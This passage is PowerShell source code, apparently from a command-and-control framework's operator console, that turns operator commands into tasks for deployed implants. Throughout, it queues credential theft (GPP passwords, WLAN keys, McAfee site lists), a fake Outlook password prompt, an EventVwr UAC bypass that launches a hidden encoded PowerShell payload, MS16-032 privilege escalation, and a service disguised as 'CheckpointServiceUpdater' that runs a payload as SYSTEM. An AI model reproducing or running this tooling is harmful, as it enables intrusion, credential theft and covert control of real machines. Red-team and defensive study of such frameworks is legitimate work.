            if ($pscommand.tolower().startswith('get-locadm'))
            {
                CheckModuleLoaded "get-locadm.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-runas'))
            {
                CheckModuleLoaded "invoke-runas.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-shellcode'))
            {
                CheckModuleLoaded "invoke-shellcode.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-pass-notexp'))
            {
                CheckModuleLoaded "get-pass-notexp.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-winrmsession'))
            {
                CheckModuleLoaded "Invoke-WinRMSession.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-computerinfo'))
            {
                CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-enum')) 
            {
                CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
                CheckModuleLoaded "Get-MSHotFixes.ps1" $psrandomuri
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
                CheckModuleLoaded "Get-RecentFiles.ps1" $psrandomuri
                CheckModuleLoaded "POwerup.ps1" $psrandomuri
                CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
                CheckModuleLoaded "Get-GPPPassword.ps1" $psrandomuri
                CheckModuleLoaded "Get-WLANPass.ps1" $psrandomuri
                $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Netstat -anp tcp; Netstat -anp udp; Net share; Ipconfig; Net view; Net users; Net localgroup administrators; Net accounts; Net accounts dom;"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Proxy; Invoke-allchecks; Get-MShotfixes"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Firewallrulesall | out-string -width 200"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Screenshot"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-GPPPassword"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-WmiObject -Class Win32_Product"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-ItemProperty -Path `"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" -Name CachedLogonsCount"
                } | Out-Null
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "Get-ItemProperty -Path `"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters`""
                } | Out-Null
                
                $pscommand = "Get-RecentFiles; Get-WLANPass"

            }
            if ($pscommand.ToLower().StartsWith('invoke-runaspayload'))
            { 
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                CheckModuleLoaded "invoke-runaspayload.ps1" $psrandomuri
                $pscommand = $pscommand -replace 'invoke-runaspayload', ''
                $pscommand = "invoke-runaspayload $($pscommand)"
                
            }     
            if ($pscommand.ToLower().StartsWith('invoke-runasproxypayload'))
            { 
            if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"     
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = '$proxypayload = "'+$proxypayload+'"'
                } | Out-Null
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                CheckModuleLoaded "invoke-runasproxypayload.ps1" $psrandomuri
                $pscommand = $pscommand -replace 'invoke-runasproxypayload', ''
                $pscommand = "invoke-runasproxypayload $($pscommand)"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('get-proxy')) 
            {
                $pscommand = 'Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"'
            }
            if ($pscommand.ToLower().StartsWith('createmacropayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand.ToLower().StartsWith('invoke-daisychain')) 
            {
                $output = Invoke-Expression $pscommand
                $pscommand = $output
            }
            if ($pscommand.ToLower().StartsWith('createproxypayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand.ToLower().StartsWith('upload-file')) 
            {
                $output = Invoke-Expression $pscommand
                $pscommand = $output
            }
            if ($pscommand.ToLower().StartsWith('createpayload')) 
            {
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand -eq 'cred-popper') 
            {
                $pscommand = '$ps = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your active directory logon details:","$env:userdomain\$env:username",""); $user = $ps.GetNetworkCredential().username; $domain = $ps.GetNetworkCredential().domain; $pass = $ps.GetNetworkCredential().password; echo "`nDomain: $domain `nUsername: $user `nPassword: $pass `n"'
                write-host "This will stall the implant until the user either enter's their credentials or cancel's the popup window"
            }
            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon'))-or ($pscommand.ToLower().StartsWith('set-beacon'))) 
            {
                $pscommand = $pscommand -replace 'set-beacon ', ''
                $pscommand = $pscommand -replace 'sleep ', ''
                $pscommand = $pscommand -replace 'beacon ', ''
                $sleeptime = $pscommand
                if ($sleeptime.ToLower().Contains('m')) { 
                    $sleeptime = $sleeptime -replace 'm', ''
                    [int]$newsleep = $sleeptime 
                    [int]$newsleep = $newsleep * 60
                }
                elseif ($sleeptime.ToLower().Contains('h')) { 
                    $sleeptime = $sleeptime -replace 'h', ''
                    [int]$newsleep1 = $sleeptime 
                    [int]$newsleep2 = $newsleep1 * 60
                    [int]$newsleep = $newsleep2 * 60
                }
                elseif ($sleeptime.ToLower().Contains('s')) { 
                    $newsleep = $sleeptime -replace 's', ''
                } else {
                    $newsleep = $sleeptime
                }
                $pscommand = '$sleeptime = '+$newsleep
                $query = "UPDATE Implants SET Sleep=@Sleep WHERE RandomURI=@RandomURI"
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    Sleep = $newsleep
                    RandomURI = $psrandomuri
                } | Out-Null
            }
            if (($pscommand.ToLower().StartsWith('turtle')) -or ($pscommand.ToLower().StartsWith('start-sleep'))) 
            {
                $pscommand = $pscommand -replace 'start-sleep ', ''
                $pscommand = $pscommand -replace 'turtle ', ''
                $sleeptime = $pscommand
                if ($sleeptime.ToLower().Contains('m')) { 
                    $sleeptime = $sleeptime -replace 'm', ''
                    [int]$newsleep = $sleeptime 
                    [int]$newsleep = $newsleep * 60
                }
                elseif ($sleeptime.ToLower().Contains('h')) { 
                    $sleeptime = $sleeptime -replace 'h', ''
                    [int]$newsleep1 = $sleeptime 
                    [int]$newsleep2 = $newsleep1 * 60
                    [int]$newsleep = $newsleep2 * 60
                }
                elseif ($sleeptime.ToLower().Contains('s')) { 
                    $newsleep = $sleeptime -replace 's', ''
                } else {
                    $newsleep = $sleeptime
                }
                $pscommand = 'Start-Sleep '+$newsleep
            }
            if ($pscommand -eq 'invoke-ms16-032')
            { 
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $pscommand = "LoadModule invoke-ms16-032.ps1"
            }
            if ($pscommand -eq 'invoke-ms16-032-proxypayload')
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $pscommand = "LoadModule invoke-ms16-032-proxy.ps1"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand -eq 'invoke-uacbypassproxy')
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    CheckModuleLoaded "ProxyPayload.ps1" $psrandomuri
                    CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                    CheckModuleLoaded "Invoke-EventVwrBypass.ps1" $psrandomuri
                    $pspayloadnamedpipe = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
                    $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
                    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
                    $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`"" 
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }            
            }
            if ($pscommand -eq 'invoke-uacbypass')
            { 
                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"  
                CheckModuleLoaded "Invoke-EventVwrBypass.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $pspayloadnamedpipe = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
                $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
                $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
                $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`""               
            } 
 
            if ($pscommand -eq 'Get-System') 
            {
                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"

                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                } | Out-Null

                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"

                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "sc.exe start CPUpdater"
                } | Out-Null
                $pscommand = "sc.exe delete CPUpdater"

            }
            if ($pscommand -eq 'Get-System-WithProxy') 
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){
                    $payload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"

                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $psrandomuri
                        Command   = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                    } | Out-Null

                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $psrandomuri
                        Command   = "sc.exe start CPUpdater"
                    } | Out-Null
                    $pscommand = "sc.exe delete CPUpdater"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }                   
            if ($pscommand -eq 'Hide-Implant') 
            {
                $pscommand = "Hide"
            }
            if ($pscommand -eq 'Unhide-Implant' ) {
               Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='Yes' WHERE RandomURI='$psrandomuri'" | Out-Null
            }
            $pscommand
}
# command process loop
while($true)
{
    $global:command = Read-Host -Prompt $global:cmdlineinput

    if ($global:command)
    {
        $query = "INSERT INTO History (Command)
        VALUES (@Command)"

        Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
        Command = $global:command
        } | Out-Null
                              
        if ($global:implantid -eq "ALL")
        {
            if ($global:command -eq 'back' -or $global:command -eq 'exit') 
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            elseif ($global:command -eq '?') 
            {
                print-help
            }
            else 
            {
                $dbresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE Alive='Yes'" -As SingleValue
                foreach ($implanturisingular in $dbresults)
                {
                    $global:randomuri = $implanturisingular
                    $outputcmd = runcommand $global:command $global:randomuri 
                    if (($outputcmd -eq 'exit' ) -or ($outputcmd -eq 'hide' )) 
                    {
                        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$implanturisingular'"|Out-Null
                    }
                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $implanturisingular
                        Command   = $outputcmd
                    } | Out-Null
                }
            }
        }
        elseif ($global:implantid.contains(",")){
            if ($global:command -eq 'back' -or $global:command -eq 'exit')
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            elseif ($global:command -eq '?') 
            {
                print-help
            } 
            else 
            {
                $global:implantid.split(",")| foreach {
                    $global:randomuri = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE ImplantID='$_'" -as SingleValue
                    $outputcmd = runcommand $global:command $global:randomuri
                    if (($global:command -eq 'exit' ) -or ($outputcmd -eq 'hide' )) 
                    {
                        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$global:randomuri'"|Out-Null
                    }
                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $global:randomuri
                        Command   = $outputcmd
                    } | Out-Null
                }
            }            
        }
        else 
        {
            if ($global:command -eq 'back' -or $global:command -eq 'exit') 
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            elseif ($global:command -eq '?') 
            {
                print-help
            } 
            else 
            {
                #write-host $global:command $global:randomuri
                $outputcmd = runcommand $global:command $global:randomuri
                if ($outputcmd -eq 'hide') 
                {
                    Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$global:randomuri'"|Out-Null
                    $outputcmd = $null
                }  
                if ($outputcmd) {
                    $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $global:randomuri
                        Command   = $outputcmd
                    } | Out-Null
                }
            }
        }
    }
}
}


